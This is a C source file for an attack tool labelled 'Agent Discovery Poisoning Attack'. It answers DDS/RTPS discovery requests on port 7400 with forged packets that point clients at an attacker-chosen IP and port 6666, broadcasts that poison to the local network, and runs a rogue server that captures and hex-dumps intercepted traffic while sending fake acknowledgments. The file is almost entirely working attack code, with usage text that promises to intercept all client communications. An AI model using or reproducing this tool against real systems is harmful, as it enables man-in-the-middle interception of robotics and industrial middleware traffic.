// Compile: gcc attack_discovery_poison.c -o discovery_poison -lpthread
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <errno.h>

#define DISCOVERY_PORT 7400
#define ROGUE_AGENT_PORT 6666
#define BUFFER_SIZE 1024
#define MAX_THREADS 2

// Simplified RTPS header structure
typedef struct {
    uint8_t protocol[4];      // "RTPS"
    uint8_t version_major;
    uint8_t version_minor;
    uint8_t vendor_id[2];
    uint8_t guid_prefix[12];
} __attribute__((packed)) rtps_header_t;

// Submessage header
typedef struct {
    uint8_t submessage_id;
    uint8_t flags;
    uint16_t submessage_length;
} __attribute__((packed)) submessage_header_t;

// Thread argument structure
typedef struct {
    char malicious_ip[16];
} thread_args_t;

// Global flag for graceful shutdown
volatile int running = 1;

void* rogue_agent_server(void* arg) {
    thread_args_t* args = (thread_args_t*)arg;
    
    printf("[*] Starting rogue agent server on port %d...\n", ROGUE_AGENT_PORT);
    
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("[-] Socket creation failed");
        return NULL;
    }
    
    // Set socket options
    int reuse = 1;
    if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse)) < 0) {
        perror("[-] Setsockopt SO_REUSEADDR failed");
    }
    
    // Set receive timeout
    struct timeval tv;
    tv.tv_sec = 1;
    tv.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    
    struct sockaddr_in bind_addr;
    memset(&bind_addr, 0, sizeof(bind_addr));
    bind_addr.sin_family = AF_INET;
    bind_addr.sin_addr.s_addr = INADDR_ANY;
    bind_addr.sin_port = htons(ROGUE_AGENT_PORT);
    
    if (bind(sock, (struct sockaddr*)&bind_addr, sizeof(bind_addr)) < 0) {
        perror("[-] Bind failed");
        close(sock);
        return NULL;
    }
    
    printf("[+] Rogue agent listening on port %d\n", ROGUE_AGENT_PORT);
    
    uint8_t buffer[BUFFER_SIZE];
    struct sockaddr_in client_addr;
    socklen_t addr_len = sizeof(client_addr);
    
    while (running) {
        int recv_len = recvfrom(sock, buffer, BUFFER_SIZE, 0,
                               (struct sockaddr*)&client_addr, &addr_len);
        
        if (recv_len > 0) {
            char client_ip[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, &client_addr.sin_addr, client_ip, sizeof(client_ip));
            
            printf("[+] Intercepted %d bytes from %s:%d\n", 
                   recv_len, client_ip, ntohs(client_addr.sin_port));
            
            // Log first 64 bytes in hex
            printf("[DATA] ");
            int print_len = recv_len < 64 ? recv_len : 64;
            for (int i = 0; i < print_len; i++) {
                printf("%02X ", buffer[i]);
                if ((i + 1) % 16 == 0) printf("\n       ");
            }
            printf("\n");
            
            // Send fake RTPS acknowledgment
            uint8_t ack[12];
            memcpy(ack, "RTPS", 4);
            ack[4] = 2;  // version major
            ack[5] = 3;  // version minor
            ack[6] = 0x01;  // vendor id
            ack[7] = 0x0F;
            memset(ack + 8, 0, 4);
            
            sendto(sock, ack, sizeof(ack), 0,
                  (struct sockaddr*)&client_addr, addr_len);
            
            printf("[+] Sent fake ACK to %s\n", client_ip);
        } else if (recv_len < 0 && errno != EAGAIN && errno != EWOULDBLOCK) {
            perror("[-] Recvfrom error");
        }
    }
    
    close(sock);
    printf("[*] Rogue agent server stopped\n");
    return NULL;
}

void* discovery_responder(void* arg) {
    thread_args_t* args = (thread_args_t*)arg;
    
    printf("[*] Starting discovery responder on port %d...\n", DISCOVERY_PORT);
    
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("[-] Socket creation failed");
        return NULL;
    }
    
    // Set socket options
    int reuse = 1;
    if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse)) < 0) {
        perror("[-] Setsockopt SO_REUSEADDR failed");
    }
    
    // Set broadcast option for sending
    int broadcast = 1;
    if (setsockopt(sock, SOL_SOCKET, SO_BROADCAST, &broadcast, sizeof(broadcast)) < 0) {
        perror("[-] Setsockopt SO_BROADCAST failed");
    }
    
    // Set receive timeout
    struct timeval tv;
    tv.tv_sec = 1;
    tv.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    
    struct sockaddr_in bind_addr;
    memset(&bind_addr, 0, sizeof(bind_addr));
    bind_addr.sin_family = AF_INET;
    bind_addr.sin_addr.s_addr = INADDR_ANY;
    bind_addr.sin_port = htons(DISCOVERY_PORT);
    
    if (bind(sock, (struct sockaddr*)&bind_addr, sizeof(bind_addr)) < 0) {
        perror("[-] Bind failed");
        close(sock);
        return NULL;
    }
    
    printf("[+] Discovery responder listening on port %d\n", DISCOVERY_PORT);
    
    uint8_t buffer[BUFFER_SIZE];
    struct sockaddr_in client_addr;
    socklen_t addr_len = sizeof(client_addr);
    
    while (running) {
        int recv_len = recvfrom(sock, buffer, BUFFER_SIZE, 0,
                               (struct sockaddr*)&client_addr, &addr_len);
        
        if (recv_len > 0) {
            char client_ip[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, &client_addr.sin_addr, client_ip, sizeof(client_ip));
            
            printf("[*] Discovery request from %s:%d (%d bytes)\n", 
                   client_ip, ntohs(client_addr.sin_port), recv_len);
            
            // Craft malicious discovery response
            uint8_t response[256];
            memset(response, 0, sizeof(response));
            int offset = 0;
            
            // RTPS header
            rtps_header_t* header = (rtps_header_t*)response;
            memcpy(header->protocol, "RTPS", 4);
            header->version_major = 2;
            header->version_minor = 3;
            header->vendor_id[0] = 0x01;
            header->vendor_id[1] = 0x0F;
            memset(header->guid_prefix, 0x42, 12);  // Fake GUID
            
            offset += sizeof(rtps_header_t);
            
            // Submessage: INFO_DST (0x0E)
            submessage_header_t* submsg = (submessage_header_t*)(response + offset);
            submsg->submessage_id = 0x0E;
            submsg->flags = 0x01;
            submsg->submessage_length = htons(12);
            offset += sizeof(submessage_header_t);
            
            // GUID prefix (destination)
            memset(response + offset, 0xFF, 12);
            offset += 12;
            
            // Submessage: DATA with locator
            submsg = (submessage_header_t*)(response + offset);
            submsg->submessage_id = 0x15;  // DATA
            submsg->flags = 0x05;
            
            offset += sizeof(submessage_header_t);
            int data_start = offset;
            
            // Convert malicious IP to network format
            struct in_addr mal_addr;
            if (inet_pton(AF_INET, args->malicious_ip, &mal_addr) != 1) {
                printf("[-] Invalid malicious IP format\n");
                continue;
            }
            
            // Add locator information
            // Locator kind (UDPv4 = 1)
            uint32_t locator_kind = htonl(1);
            memcpy(response + offset, &locator_kind, 4);
            offset += 4;
            
            // Port
            uint32_t port = htonl(ROGUE_AGENT_PORT);
            memcpy(response + offset, &port, 4);
            offset += 4;
            
            // IP address (as 16-byte IPv6 format, but IPv4-mapped)
            memset(response + offset, 0, 12);
            offset += 12;
            memcpy(response + offset, &mal_addr, 4);
            offset += 4;
            
            // Update submessage length
            int data_length = offset - data_start;
            submsg->submessage_length = htons(data_length);
            
            // Send malicious response back to requester
            int sent = sendto(sock, response, offset, 0,
                            (struct sockaddr*)&client_addr, addr_len);
            
            if (sent > 0) {
                printf("[+] Sent poisoned response (%d bytes) redirecting to %s:%d\n", 
                       sent, args->malicious_ip, ROGUE_AGENT_PORT);
            } else {
                perror("[-] Failed to send response");
            }
            
            // Also broadcast to local network
            struct sockaddr_in broadcast_addr;
            memset(&broadcast_addr, 0, sizeof(broadcast_addr));
            broadcast_addr.sin_family = AF_INET;
            broadcast_addr.sin_addr.s_addr = htonl(INADDR_BROADCAST);
            broadcast_addr.sin_port = htons(DISCOVERY_PORT);
            
            sendto(sock, response, offset, 0,
                  (struct sockaddr*)&broadcast_addr, sizeof(broadcast_addr));
            
        } else if (recv_len < 0 && errno != EAGAIN && errno != EWOULDBLOCK) {
            perror("[-] Recvfrom error");
        }
    }
    
    close(sock);
    printf("[*] Discovery responder stopped\n");
    return NULL;
}

void signal_handler(int signum) {
    (void)signum;
    printf("\n[*] Shutting down gracefully...\n");
    running = 0;
}

int main(int argc, char** argv) {
    if (argc != 2) {
        printf("Usage: %s <malicious_agent_ip>\n", argv[0]);
        printf("Example: %s 192.168.1.100\n", argv[0]);
        printf("\nThis will:\n");
        printf("1. Respond to discovery requests on port %d\n", DISCOVERY_PORT);
        printf("2. Redirect clients to rogue agent at <ip>:%d\n", ROGUE_AGENT_PORT);
        printf("3. Intercept all client communications\n");
        printf("\nNote: May require root privileges to bind to port %d\n", DISCOVERY_PORT);
        return 1;
    }
    
    // Check if running as root
    if (geteuid() != 0) {
        printf("[WARNING] Not running as root. May fail to bind to port %d\n", DISCOVERY_PORT);
        printf("          Run with: sudo %s %s\n", argv[0], argv[1]);
    }
    
    thread_args_t args;
    strncpy(args.malicious_ip, argv[1], sizeof(args.malicious_ip) - 1);
    args.malicious_ip[sizeof(args.malicious_ip) - 1] = '\0';
    
    // Validate IP address
    struct in_addr test_addr;
    if (inet_pton(AF_INET, args.malicious_ip, &test_addr) != 1) {
        printf("[-] Invalid IP address: %s\n", args.malicious_ip);
        return 1;
    }
    
    printf("=== Agent Discovery Poisoning Attack ===\n");
    printf("Rogue agent IP: %s\n", args.malicious_ip);
    printf("Rogue agent port: %d\n", ROGUE_AGENT_PORT);
    printf("Discovery port: %d\n\n", DISCOVERY_PORT);
    
    // Set up signal handler for graceful shutdown
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    
    pthread_t responder_thread, server_thread;
    
    // Start discovery responder
    if (pthread_create(&responder_thread, NULL, discovery_responder, &args) != 0) {
        perror("[-] Failed to create responder thread");
        return 1;
    }
    
    sleep(1);
    
    // Start rogue agent server
    if (pthread_create(&server_thread, NULL, rogue_agent_server, &args) != 0) {
        perror("[-] Failed to create server thread");
        running = 0;
        pthread_join(responder_thread, NULL);
        return 1;
    }
    
    printf("\n[*] Rogue infrastructure running...\n");
    printf("[*] Press Ctrl+C to stop\n\n");
    
    // Wait for threads to complete
    pthread_join(responder_thread, NULL);
    pthread_join(server_thread, NULL);
    
    printf("\n[*] Attack stopped\n");
    return 0;
}
